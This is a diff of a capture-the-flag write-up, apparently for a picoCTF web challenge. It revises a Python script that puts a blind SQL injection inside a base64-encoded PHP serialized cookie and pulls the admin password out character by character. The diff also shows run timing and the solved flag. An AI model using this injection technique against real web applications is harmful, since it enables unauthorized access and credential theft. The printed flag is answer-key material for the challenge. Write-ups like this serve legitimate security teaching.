@@ -169,36 +169,47 @@ we can access the admin page.
 
 This confirms we can hit the bad SQL. However we also need to chain this with another way of leaking the admin password, which is the flag.
 
-To do this we can use a query to see if the password is `LIKE` a certain string. This lets us guess char by char, instead of all at once.
+To do this we can use a query to see if the password is `LIKE` a certain string. This lets us guess char by char, instead of all at once. We also need the `BINARY` to make the query case sensitive.
 
 ```python
 import requests
 import string
 import base64
 
-def send_req(password):
-    print("trying {}".format(password))
-    payload = ('O:8:"siteuser":2:{{s:8:"username";s:5:"admin";s:8:"password";s:{}:"{}";}}'.format(len(password), password)).encode('utf-8')
+
+def try_pwd(password):
+    print("Testing: {}".format(password))
+    injection = "' OR password LIKE BINARY '{}%".format(password)
+    payload = 'O:8:"siteuser":2:{{s:8:"username";s:5:"admin";s:8:"password";s:{}:"{}";}}'.format(
+        len(injection), injection).encode('utf-8')
     cookies = dict(user_info=base64.b64encode(payload).decode('utf-8'))
-    r = requests.get("http://2019shell1.picoctf.com:62195/index.php?file=admin", cookies=cookies)
-    if "Welcome" in r.text:
-        return True
-    else:
-        return False
+    r = requests.get(
+        "http://2019shell1.picoctf.com:62195/index.php?file=admin", cookies=cookies)
+    return "Welcome" in r.text
+
 
 alpha = string.digits + string.ascii_letters + '{}'
 
 flag = ""
 while True:
     for c in alpha:
-        if send_req("' or password like BINARY '" + flag + c + "%"):
+        if try_pwd(flag + c):
             flag += c
-            print(flag)
+            print("Match: {}".format(flag))
             break
     else:
         break
+
+print("Flag: {}".format(flag))
 ```
-This solves the password in just `742`. If we didn't guess char by char, it would have taken at least `10325409078130535858577322089156227414836089918524569419776` guesses. Have a look [at the output](./output.txt) for how it guessed.
+
+This takes about 3 mins, most of which is spend waiting for the server
+
+```text
+real	2m49.461s
+user	0m3.797s
+sys	0m0.692s
+```
 
 Flag: `picoCTF{c9f6ad462c6bb64a53c6e7a6452a6eb7}`
 
